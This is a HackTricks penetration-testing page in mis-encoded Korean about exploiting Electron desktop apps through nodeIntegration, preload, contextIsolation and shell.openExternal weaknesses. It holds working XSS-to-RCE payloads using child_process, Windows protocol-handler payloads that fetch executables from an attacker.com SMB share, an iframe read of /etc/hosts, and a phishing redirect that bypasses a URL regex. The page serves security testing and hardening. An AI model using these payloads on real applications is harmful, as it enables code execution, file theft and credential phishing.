# Electron ë°ìŠ¤í¬í†± ì•±

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ìš°ì„¸ìš”</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>!</strong></a><strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ê°€ HackTricksì— ê´‘ê³ ë˜ê¸¸ ì›í•˜ê±°ë‚˜** **PDFë¡œ HackTricksë¥¼ ë‹¤ìš´ë¡œë“œ**í•˜ê³  ì‹¶ë‹¤ë©´ [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* **ğŸ’¬ [Discord ê·¸ë£¹](https://discord.gg/hRep4RUj7f)** ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì„¸ìš”.

</details>

### [WhiteIntel](https://whiteintel.io)

<figure><img src="/.gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io)ì€ **ë‹¤í¬ ì›¹**ì„ í™œìš©í•œ ê²€ìƒ‰ ì—”ì§„ìœ¼ë¡œ, íšŒì‚¬ë‚˜ ê³ ê°ì´ **ìŠ¤í‹¸ëŸ¬ ì•…ì„± ì†Œí”„íŠ¸ì›¨ì–´**ì— ì˜í•´ **ì¹¨í•´**ë‹¹í–ˆëŠ”ì§€ ë¬´ë£Œë¡œ í™•ì¸í•  ìˆ˜ ìˆëŠ” ê¸°ëŠ¥ì„ ì œê³µí•©ë‹ˆë‹¤.

WhiteIntelì˜ ì£¼ìš” ëª©í‘œëŠ” ì •ë³´ë¥¼ ë„ë‚œí•˜ëŠ” ì•…ì„± ì†Œí”„íŠ¸ì›¨ì–´ë¡œ ì¸í•œ ê³„ì • íƒˆì·¨ ë° ëœì„¬ì›¨ì–´ ê³µê²©ì„ ë§‰ëŠ” ê²ƒì…ë‹ˆë‹¤.

ê·¸ë“¤ì˜ ì›¹ì‚¬ì´íŠ¸ë¥¼ ë°©ë¬¸í•˜ì—¬ ì—”ì§„ì„ ë¬´ë£Œë¡œ ì‹œí—˜í•´ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% embed url="https://whiteintel.io" %}

---

## ì†Œê°œ

Electronì€ ë¡œì»¬ ë°±ì—”ë“œ(**NodeJS** í¬í•¨)ì™€ í”„ë¡ íŠ¸ì—”ë“œ(**Chromium**)ë¥¼ ê²°í•©í•œ ê²ƒì´ì§€ë§Œ, í˜„ëŒ€ ë¸Œë¼ìš°ì €ì˜ ë³´ì•ˆ ë©”ì»¤ë‹ˆì¦˜ ì¤‘ ì¼ë¶€ê°€ ë¶€ì¡±í•©ë‹ˆë‹¤.

ì¼ë°˜ì ìœ¼ë¡œ `.asar` ì• í”Œë¦¬ì¼€ì´ì…˜ ë‚´ì— electron ì•± ì½”ë“œë¥¼ ì°¾ì„ ìˆ˜ ìˆìœ¼ë©°, ì½”ë“œë¥¼ ì–»ìœ¼ë ¤ë©´ ì¶”ì¶œí•´ì•¼ í•©ë‹ˆë‹¤:
```bash
npx asar extract app.asar destfolder #Extract everything
npx asar extract-file app.asar main.js #Extract just a file
```
Electron ì•±ì˜ ì†ŒìŠ¤ ì½”ë“œì—ì„œ `packet.json` íŒŒì¼ ë‚´ì—ì„œ ë³´ì•ˆ êµ¬ì„±ì´ ì„¤ì •ëœ `main.js` íŒŒì¼ì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```json
{
"name": "standard-notes",
"main": "./app/index.js",
```
Electronì—ëŠ” 2ê°€ì§€ í”„ë¡œì„¸ìŠ¤ ìœ í˜•ì´ ìˆìŠµë‹ˆë‹¤:

* Main Process (NodeJSì— ì™„ì „í•œ ì•¡ì„¸ìŠ¤ ê¶Œí•œì´ ìˆìŒ)
* Renderer Process (ë³´ì•ˆìƒì˜ ì´ìœ ë¡œ NodeJS ì•¡ì„¸ìŠ¤ê°€ ì œí•œë˜ì–´ì•¼ í•¨)

![](<../../../.gitbook/assets/image (179).png>)

**ë Œë”ëŸ¬ í”„ë¡œì„¸ìŠ¤**ëŠ” íŒŒì¼ì„ ë¡œë“œí•˜ëŠ” ë¸Œë¼ìš°ì € ì°½ì´ ë  ê²ƒì…ë‹ˆë‹¤:
```javascript
const {BrowserWindow} = require('electron');
let win = new BrowserWindow();

//Open Renderer Process
win.loadURL(`file://path/to/index.html`);
```
**ë Œë”ëŸ¬ í”„ë¡œì„¸ìŠ¤**ì˜ ì„¤ì •ì€ main.js íŒŒì¼ ë‚´ë¶€ì˜ **ë©”ì¸ í”„ë¡œì„¸ìŠ¤**ì—ì„œ **êµ¬ì„±**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì¼ë¶€ êµ¬ì„±ì€ **Electron ì• í”Œë¦¬ì¼€ì´ì…˜ì´ RCEë¥¼ ë°©ì§€**í•˜ê±°ë‚˜ ë‹¤ë¥¸ ì·¨ì•½ì ì„ ë°©ì§€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ **ì„¤ì •ì´ ì˜¬ë°”ë¥´ê²Œ êµ¬ì„±**ëœ ê²½ìš°.

Electron ì• í”Œë¦¬ì¼€ì´ì…˜ì€ Node APIë¥¼ í†µí•´ ê¸°ê¸°ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆì§€ë§Œ ë‹¤ìŒì„ ë°©ì§€í•˜ë„ë¡ êµ¬ì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

* **`nodeIntegration`** - ê¸°ë³¸ì ìœ¼ë¡œ `off`ì…ë‹ˆë‹¤. ì¼œë©´ ë Œë”ëŸ¬ í”„ë¡œì„¸ìŠ¤ì—ì„œ ë…¸ë“œ ê¸°ëŠ¥ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **`contextIsolation`** - ê¸°ë³¸ì ìœ¼ë¡œ `on`ì…ë‹ˆë‹¤. ë„ë©´ ë©”ì¸ ë° ë Œë”ëŸ¬ í”„ë¡œì„¸ìŠ¤ê°€ ê²©ë¦¬ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤.
* **`preload`** - ê¸°ë³¸ì ìœ¼ë¡œ ë¹„ì–´ ìˆìŠµë‹ˆë‹¤.
* [**`sandbox`**](https://docs.w3cub.com/electron/api/sandbox-option) - ê¸°ë³¸ì ìœ¼ë¡œ êº¼ì ¸ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” NodeJSê°€ ìˆ˜í–‰í•  ìˆ˜ ìˆëŠ” ì‘ì—…ì„ ì œí•œí•©ë‹ˆë‹¤.
* Workersì—ì„œì˜ Node í†µí•©
* **`nodeIntegrationInSubframes`**- ê¸°ë³¸ì ìœ¼ë¡œ `off`ì…ë‹ˆë‹¤.
* **`nodeIntegration`**ì´ **í™œì„±í™”**ë˜ì–´ ìˆìœ¼ë©´ Electron ì• í”Œë¦¬ì¼€ì´ì…˜ ë‚´ì—ì„œ iframeì— ë¡œë“œëœ ì›¹ í˜ì´ì§€ì—ì„œ **Node.js API**ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **`nodeIntegration`**ì´ **ë¹„í™œì„±í™”**ë˜ì–´ ìˆìœ¼ë©´ preloadê°€ iframeì—ì„œ ë¡œë“œë©ë‹ˆë‹¤.

êµ¬ì„± ì˜ˆì‹œ:
```javascript
const mainWindowOptions = {
title: 'Discord',
backgroundColor: getBackgroundColor(),
width: DEFAULT_WIDTH,
height: DEFAULT_HEIGHT,
minWidth: MIN_WIDTH,
minHeight: MIN_HEIGHT,
transparent: false,
frame: false,
resizable: true,
show: isVisible,
webPreferences: {
blinkFeatures: 'EnumerateDevices,AudioOutputDevices',
nodeIntegration: false,
contextIsolation: false,
sandbox: false,
nodeIntegrationInSubFrames: false,
preload: _path2.default.join(__dirname, 'mainScreenPreload.js'),
nativeWindowOpen: true,
enableRemoteModule: false,
spellcheck: true
}
};
```
ë‹¤ìŒì€ [ì—¬ê¸°](https://7as.es/electron/nodeIntegration\_rce.txt)ì—ì„œ ê°€ì ¸ì˜¨ **RCE payloads** ëª©ë¡ì…ë‹ˆë‹¤:
```html
Example Payloads (Windows):
<img src=x onerror="alert(require('child_process').execSync('calc').toString());">

Example Payloads (Linux & MacOS):
<img src=x onerror="alert(require('child_process').execSync('gnome-calculator').toString());">
<img src=x onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());">
<img src=x onerror="alert(require('child_process').execSync('id').toString());">
<img src=x onerror="alert(require('child_process').execSync('ls -l').toString());">
<img src=x onerror="alert(require('child_process').execSync('uname -a').toString());">
```
### íŠ¸ë˜í”½ ìº¡ì²˜

start-main êµ¬ì„±ì„ ìˆ˜ì •í•˜ê³  ë‹¤ìŒê³¼ ê°™ì´ í”„ë¡ì‹œë¥¼ ì‚¬ìš©í•˜ë„ë¡ ì¶”ê°€í•˜ì‹­ì‹œì˜¤:
```javascript
"start-main": "electron ./dist/main/main.js --proxy-server=127.0.0.1:8080 --ignore-certificateerrors",
```
## Electron ë¡œì»¬ ì½”ë“œ ì‚½ì…

Electron ì•±ì„ ë¡œì»¬ì—ì„œ ì‹¤í–‰í•  ìˆ˜ ìˆë‹¤ë©´ ì„ì˜ì˜ JavaScript ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë‹¤ìŒì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="../../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md" %}
[macos-electron-applications-injection.md](../../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md)
{% endcontent-ref %}

## RCE: XSS + nodeIntegration

ë§Œì•½ **nodeIntegration**ì´ **on**ìœ¼ë¡œ ì„¤ì •ë˜ì–´ ìˆë‹¤ë©´, ì›¹ í˜ì´ì§€ì˜ JavaScriptëŠ” `require()`ë¥¼ í˜¸ì¶œí•˜ì—¬ ì‰½ê²Œ Node.js ê¸°ëŠ¥ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, Windowsì—ì„œ calc ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ì‹¤í–‰í•˜ëŠ” ë°©ë²•ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:
```html
<script>
require('child_process').exec('calc');
// or
top.require('child_process').exec('open /System/Applications/Calculator.app');
</script>
```
<figure><img src="../../../.gitbook/assets/image (1107).png" alt=""><figcaption></figcaption></figure>

## RCE: preload

ì´ ì„¤ì •ì— í‘œì‹œëœ ìŠ¤í¬ë¦½íŠ¸ëŠ” ë Œë”ëŸ¬ì—ì„œ ë‹¤ë¥¸ ìŠ¤í¬ë¦½íŠ¸ë³´ë‹¤ **ë¨¼ì € ë¡œë“œë˜ë¯€ë¡œ Node APIì— ë¬´ì œí•œ ì•¡ì„¸ìŠ¤**ê°€ ê°€ëŠ¥í•©ë‹ˆë‹¤:
```javascript
new BrowserWindow{
webPreferences: {
nodeIntegration: false,
preload: _path2.default.join(__dirname, 'perload.js'),
}
});
```
ë”°ë¼ì„œ, ìŠ¤í¬ë¦½íŠ¸ëŠ” ë…¸ë“œ ê¸°ëŠ¥ì„ í˜ì´ì§€ë¡œ ë‚´ë³´ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% code title="preload.js" %}
```javascript
typeof require === 'function';
window.runCalc = function(){
require('child_process').exec('calc')
};
```
{% endcode %}

{% code title="index.html" %}
```html
<body>
<script>
typeof require === 'undefined';
runCalc();
</script>
</body>
```
{% endcode %}

{% hint style="info" %}
**`contextIsolation`ì´ ì¼œì ¸ ìˆìœ¼ë©´ ì‘ë™í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.**
{% endhint %}

## RCE: XSS + contextIsolation

_**contextIsolation**_ì€ **ì›¹ í˜ì´ì§€ ìŠ¤í¬ë¦½íŠ¸ì™€ JavaScript Electronì˜ ë‚´ë¶€ ì½”ë“œ ê°„ì˜ ë¶„ë¦¬ëœ ì»¨í…ìŠ¤íŠ¸**ë¥¼ ì†Œê°œí•˜ì—¬ ê° ì½”ë“œì˜ JavaScript ì‹¤í–‰ì´ ì„œë¡œ ì˜í–¥ì„ ë¯¸ì¹˜ì§€ ì•Šë„ë¡ í•©ë‹ˆë‹¤. ì´ëŠ” RCE ê°€ëŠ¥ì„±ì„ ì œê±°í•˜ê¸° ìœ„í•œ í•„ìˆ˜ì ì¸ ê¸°ëŠ¥ì…ë‹ˆë‹¤.

ì»¨í…ìŠ¤íŠ¸ê°€ ë¶„ë¦¬ë˜ì§€ ì•Šìœ¼ë©´ ê³µê²©ìê°€ ë‹¤ìŒì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

1. **ë Œë”ëŸ¬ì—ì„œ ì„ì˜ì˜ JavaScript ì‹¤í–‰** (XSS ë˜ëŠ” ì™¸ë¶€ ì‚¬ì´íŠ¸ë¡œì˜ ì´ë™)
2. preload ë˜ëŠ” Electron ë‚´ë¶€ ì½”ë“œì—ì„œ ì‚¬ìš©ë˜ëŠ” **ë‚´ì¥ ë©”ì†Œë“œ ë®ì–´ì“°ê¸°**
3. **ë®ì–´ì“´ í•¨ìˆ˜ì˜ ì‚¬ìš©** ìœ ë„
4. RCE?

ë‚´ì¥ ë©”ì†Œë“œë¥¼ ë®ì–´ì“¸ ìˆ˜ ìˆëŠ” 2ê³³ì´ ìˆìŠµë‹ˆë‹¤: preload ì½”ë“œ ë˜ëŠ” Electron ë‚´ë¶€ ì½”ë“œì—ì„œ:

{% content-ref url="electron-contextisolation-rce-via-preload-code.md" %}
[electron-contextisolation-rce-via-preload-code.md](electron-contextisolation-rce-via-preload-code.md)
{% endcontent-ref %}

{% content-ref url="electron-contextisolation-rce-via-electron-internal-code.md" %}
[electron-contextisolation-rce-via-electron-internal-code.md](electron-contextisolation-rce-via-electron-internal-code.md)
{% endcontent-ref %}

{% content-ref url="electron-contextisolation-rce-via-ipc.md" %}
[electron-contextisolation-rce-via-ipc.md](electron-contextisolation-rce-via-ipc.md)
{% endcontent-ref %}

### í´ë¦­ ì´ë²¤íŠ¸ ìš°íšŒ

ë§í¬ë¥¼ í´ë¦­í•  ë•Œ ì œí•œì´ ì ìš©ëœ ê²½ìš° ì¼ë°˜ ì™¼ìª½ í´ë¦­ ëŒ€ì‹  **ê°€ìš´ë° í´ë¦­**ì„ í•˜ë©´ ìš°íšŒí•  ìˆ˜ ìˆì„ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.
```javascript
window.addEventListener('click', (e) => {
```
## shell.openExternalì„ í†µí•œ RCE

ì´ ì˜ˆì œì— ëŒ€í•œ ìì„¸í•œ ë‚´ìš©ì€ [https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8) ë° [https://benjamin-altpeter.de/shell-openexternal-dangers/](https://benjamin-altpeter.de/shell-openexternal-dangers/)ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

Electron ë°ìŠ¤í¬í†± ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ë°°í¬í•  ë•Œ `nodeIntegration` ë° `contextIsolation`ì— ëŒ€í•œ ì˜¬ë°”ë¥¸ ì„¤ì •ì„ ë³´ì¥í•˜ëŠ” ê²ƒì´ ì¤‘ìš”í•©ë‹ˆë‹¤. ì´ëŸ¬í•œ ì„¤ì •ì´ ì ìš©ë˜ë©´ preload ìŠ¤í¬ë¦½íŠ¸ë‚˜ Electronì˜ ë©”ì¸ í”„ë¡œì„¸ìŠ¤ì—ì„œì˜ **í´ë¼ì´ì–¸íŠ¸ ì¸¡ ì›ê²© ì½”ë“œ ì‹¤í–‰ (RCE)**ì´ íš¨ê³¼ì ìœ¼ë¡œ ë°©ì§€ë©ë‹ˆë‹¤.

ì‚¬ìš©ìê°€ ë§í¬ë¥¼ ìƒí˜¸ ì‘ìš©í•˜ê±°ë‚˜ ìƒˆ ì°½ì„ ì—´ ë•Œ íŠ¹ì • ì´ë²¤íŠ¸ ë¦¬ìŠ¤ë„ˆê°€ íŠ¸ë¦¬ê±°ë˜ë©°, ì´ëŠ” ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ë³´ì•ˆ ë° ê¸°ëŠ¥ì— ì¤‘ìš”í•©ë‹ˆë‹¤:
```javascript
webContents.on("new-window", function (event, url, disposition, options) {}
webContents.on("will-navigate", function (event, url) {}
```
ì´ëŸ¬í•œ ë¦¬ìŠ¤ë„ˆëŠ” ë°ìŠ¤í¬í†± ì• í”Œë¦¬ì¼€ì´ì…˜ì— ì˜í•´ **ë®ì–´ì“°ì—¬ì ¸** ìì²´ **ë¹„ì¦ˆë‹ˆìŠ¤ ë¡œì§**ì„ êµ¬í˜„í•©ë‹ˆë‹¤. ì• í”Œë¦¬ì¼€ì´ì…˜ì€ íƒìƒ‰ëœ ë§í¬ë¥¼ ë‚´ë¶€ì ìœ¼ë¡œ ì—´ì§€, ì™¸ë¶€ ì›¹ ë¸Œë¼ìš°ì €ì—ì„œ ì—´ì§€ë¥¼ íŒë‹¨í•©ë‹ˆë‹¤. ì´ ê²°ì •ì€ ì¼ë°˜ì ìœ¼ë¡œ `openInternally` í•¨ìˆ˜ë¥¼ í†µí•´ ì´ë£¨ì–´ì§‘ë‹ˆë‹¤. ì´ í•¨ìˆ˜ê°€ `false`ë¥¼ ë°˜í™˜í•˜ë©´, í•´ë‹¹ ë§í¬ëŠ” `shell.openExternal` í•¨ìˆ˜ë¥¼ í™œìš©í•˜ì—¬ ì™¸ë¶€ì—ì„œ ì—´ë¦¬ë„ë¡ ì§€ì‹œí•©ë‹ˆë‹¤.

**ë‹¤ìŒì€ ê°„ë‹¨í•œ ì˜ì‚¬ ì½”ë“œì…ë‹ˆë‹¤:**

![https://miro.medium.com/max/1400/1\*iqX26DMEr9RF7nMC1ANMAA.png](<../../../.gitbook/assets/image (258).png>)

![https://miro.medium.com/max/1400/1\*ZfgVwT3X1V\_UfjcKaAccag.png](<../../../.gitbook/assets/image (960).png>)

Electron JS ë³´ì•ˆ ëª¨ë² ìŠ¤íŠ¸ í”„ë™í‹°ìŠ¤ëŠ” `openExternal` í•¨ìˆ˜ë¥¼ í†µí•´ ì‹ ë¢°í•  ìˆ˜ ì—†ëŠ” ì½˜í…ì¸ ë¥¼ ìˆ˜ìš©í•˜ì§€ ì•ŠëŠ” ê²ƒì„ ê¶Œì¥í•˜ë©°, ì´ëŠ” ë‹¤ì–‘í•œ í”„ë¡œí† ì½œì„ í†µí•´ RCEë¡œ ì´ì–´ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ìš´ì˜ ì²´ì œëŠ” RCEë¥¼ ìœ ë°œí•  ìˆ˜ ìˆëŠ” ë‹¤ì–‘í•œ í”„ë¡œí† ì½œì„ ì§€ì›í•©ë‹ˆë‹¤. ì´ ì£¼ì œì— ëŒ€í•œ ìì„¸í•œ ì˜ˆì œ ë° ì„¤ëª…ì€ [ì´ ë¦¬ì†ŒìŠ¤](https://positive.security/blog/url-open-rce#windows-10-19042)ë¥¼ ì°¸ì¡°í•  ìˆ˜ ìˆìœ¼ë©°, ì´ëŠ” ì´ ì·¨ì•½ì ì„ ì•…ìš©í•  ìˆ˜ ìˆëŠ” Windows í”„ë¡œí† ì½œ ì˜ˆì œë¥¼ í¬í•¨í•˜ê³  ìˆìŠµë‹ˆë‹¤.

**Windows í”„ë¡œí† ì½œ ì•…ìš© ì˜ˆì‹œ:**
```html
<script>
window.open("ms-msdt:id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fskip%20true%20%2Fparam%20IT_BrowseForFile%3D%22%5Cattacker.comsmb_sharemalicious_executable.exe%22%20%2Fparam%20IT_SelectProgram%3D%22NotListed%22%20%2Fparam%20IT_AutoTroubleshoot%3D%22ts_AUTO%22")
</script>

<script>
window.open("search-ms:query=malicious_executable.exe&crumb=location:%5C%5Cattacker.com%5Csmb_share%5Ctools&displayname=Important%20update")
</script>

<script>
window.open("ms-officecmd:%7B%22id%22:3,%22LocalProviders.LaunchOfficeAppForResult%22:%7B%22details%22:%7B%22appId%22:5,%22name%22:%22Teams%22,%22discovered%22:%7B%22command%22:%22teams.exe%22,%22uri%22:%22msteams%22%7D%7D,%22filename%22:%22a:/b/%2520--disable-gpu-sandbox%2520--gpu-launcher=%22C:%5CWindows%5CSystem32%5Ccmd%2520/c%2520ping%252016843009%2520&&%2520%22%22%7D%7D")
</script>
```
## ë‚´ë¶€ íŒŒì¼ ì½ê¸°: XSS + contextIsolation

**`contextIsolation` ë¹„í™œì„±í™”ëŠ” `<webview>` íƒœê·¸ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆê²Œ í•˜ë©°**, `<iframe>`ê³¼ ìœ ì‚¬í•˜ê²Œ ë¡œì»¬ íŒŒì¼ì„ ì½ê³  ìœ ì¶œí•˜ëŠ” ë° ì‚¬ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì œê³µëœ ì˜ˆì œëŠ” ë‚´ë¶€ íŒŒì¼ì˜ ë‚´ìš©ì„ ì½ê¸° ìœ„í•´ ì´ ì·¨ì•½ì ì„ ì•…ìš©í•˜ëŠ” ë°©ë²•ì„ ë³´ì—¬ì¤ë‹ˆë‹¤:

![](<../../../.gitbook/assets/1 u1jdRYuWAEVwJmf_F2ttJg (1).png>)

ë˜í•œ **ë‚´ë¶€ íŒŒì¼ì„ ì½ëŠ” ë˜ ë‹¤ë¥¸ ë°©ë²•**ì´ ê³µìœ ë˜ë©°, Electron ë°ìŠ¤í¬í†± ì•±ì—ì„œ ì¤‘ìš”í•œ ë¡œì»¬ íŒŒì¼ ì½ê¸° ì·¨ì•½ì ì„ ê°•ì¡°í•©ë‹ˆë‹¤. ì´ëŠ” ì‘ìš© í”„ë¡œê·¸ë¨ì„ ì•…ìš©í•˜ê³  ë°ì´í„°ë¥¼ ìœ ì¶œí•˜ê¸° ìœ„í•´ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‚½ì…í•˜ëŠ” ê²ƒì„ í¬í•¨í•©ë‹ˆë‹¤:
```html
<br><BR><BR><BR>
<h1>pwn<br>
<iframe onload=j() src="/etc/hosts">xssxsxxsxs</iframe>
<script type="text/javascript">
function j(){alert('pwned contents of /etc/hosts :\n\n '+frames[0].document.body.innerText)}
</script>
```
## **RCE: XSS + Old Chromium**

ë§Œì•½ ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ ì‚¬ìš©í•˜ëŠ” **í¬ë¡œë¯¸ì›€**ì´ **ì˜¤ë˜ë˜ì—ˆê³ ** ê·¸ ìœ„ì— **ì•Œë ¤ì§„ ì·¨ì•½ì **ì´ ìˆë‹¤ë©´, **XSSë¥¼ í†µí•´ RCEë¥¼ ì–»ì„ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤**.\
ì´ **writeup**ì—ì„œ ì˜ˆì œë¥¼ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤: [https://blog.electrovolt.io/posts/discord-rce/](https://blog.electrovolt.io/posts/discord-rce/)

## **ë‚´ë¶€ URL ì •ê·œì‹ ìš°íšŒë¥¼ í†µí•œ XSS í”¼ì‹±**

ë§Œì•½ XSSë¥¼ ë°œê²¬í–ˆì§€ë§Œ **RCEë¥¼ ìœ ë°œí•˜ê±°ë‚˜ ë‚´ë¶€ íŒŒì¼ì„ íƒˆì·¨í•  ìˆ˜ ì—†ë‹¤ë©´**, ì´ë¥¼ ì‚¬ìš©í•˜ì—¬ **í”¼ì‹±ì„ í†µí•´ ìê²© ì¦ëª…ì„ íƒˆì·¨**í•´ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ìš°ì„ , í”„ë¡ íŠ¸ì—”ë“œì˜ JS ì½”ë“œë¥¼ í™•ì¸í•˜ì—¬ ìƒˆ URLì„ ì—´ë ¤ê³  í•  ë•Œ ë¬´ìŠ¨ ì¼ì´ ë°œìƒí•˜ëŠ”ì§€ ì•Œì•„ì•¼ í•©ë‹ˆë‹¤:
```javascript
webContents.on("new-window", function (event, url, disposition, options) {} // opens the custom openInternally function (it is declared below)
webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)
```
**`openInternally`** í˜¸ì¶œì€ ë§í¬ê°€ í”Œë«í¼ì— ì†í•˜ëŠ” ë§í¬ì¸ ê²½ìš° **ë°ìŠ¤í¬í†± ì°½**ì—ì„œ ì—´ì§€, **ë˜ëŠ”** ë¸Œë¼ìš°ì €ì—ì„œ **3rd party ìì›ìœ¼ë¡œ ì—´ì§€**ë¥¼ ê²°ì •í•©ë‹ˆë‹¤.

í•¨ìˆ˜ì—ì„œ ì‚¬ìš©ëœ **ì •ê·œ í‘œí˜„ì‹**ì´ **ìš°íšŒ ê°€ëŠ¥**í•œ ê²½ìš°(ì˜ˆ: **ì„œë¸Œë„ë©”ì¸ì˜ ì ì„ ì´ìŠ¤ì¼€ì´í”„í•˜ì§€ ì•ŠìŒ**), ê³µê²©ìëŠ” XSSë¥¼ ì•…ìš©í•˜ì—¬ ì‚¬ìš©ìì—ê²Œ **ìê²© ì¦ëª…ì„ ìš”ì²­í•˜ëŠ”** ê³µê²©ìì˜ ì¸í”„ë¼ì— ìœ„ì¹˜í•œ **ìƒˆ ì°½ì„ ì—´ ìˆ˜ ìˆìŠµë‹ˆë‹¤**:
```html
<script>
window.open("<http://subdomainagoogleq.com/index.html>")
</script>
```
## **ë„êµ¬**

* [**Electronegativity**](https://github.com/doyensec/electronegativity)ì€ Electron ê¸°ë°˜ ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ êµ¬ì„± ì˜¤ë¥˜ì™€ ë³´ì•ˆ ì•ˆí‹° íŒ¨í„´ì„ ì‹ë³„í•˜ëŠ” ë„êµ¬ì…ë‹ˆë‹¤.
* [**Electrolint**](https://github.com/ksdmitrieva/electrolint)ì€ Electronegativityë¥¼ ì‚¬ìš©í•˜ëŠ” Electron ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ìœ„í•œ ì˜¤í”ˆ ì†ŒìŠ¤ VS Code í”ŒëŸ¬ê·¸ì¸ì…ë‹ˆë‹¤.
* [**nodejsscan**](https://github.com/ajinabraham/nodejsscan)ì€ ì·¨ì•½í•œ ì„œë“œ íŒŒí‹° ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ í™•ì¸í•˜ëŠ” ë„êµ¬ì…ë‹ˆë‹¤.
* [**Electro.ng**](https://electro.ng/): êµ¬ë§¤í•´ì•¼ í•©ë‹ˆë‹¤

## ë©

[https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s)ì—ì„œ ì·¨ì•½í•œ Electron ì•±ì„ ì•…ìš©í•˜ëŠ” ë©ì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë©ì„ ë„ìš¸ ëª‡ ê°€ì§€ ëª…ë ¹ì–´:
```bash
# Download apps from these URls
# Vuln to nodeIntegration
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable1.zip
# Vuln to contextIsolation via preload script
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable2.zip
# Vuln to IPC Rce
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable3.zip

# Get inside the electron app and check for vulnerabilities
npm audit

# How to use electronegativity
npm install @doyensec/electronegativity -g
electronegativity -i vulnerable1

# Run an application from source code
npm install -g electron
cd vulnerable1
npm install
npm start
```
## **ì°¸ê³  ìë£Œ**

* [https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028](https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028)
* [https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)
* [https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8)
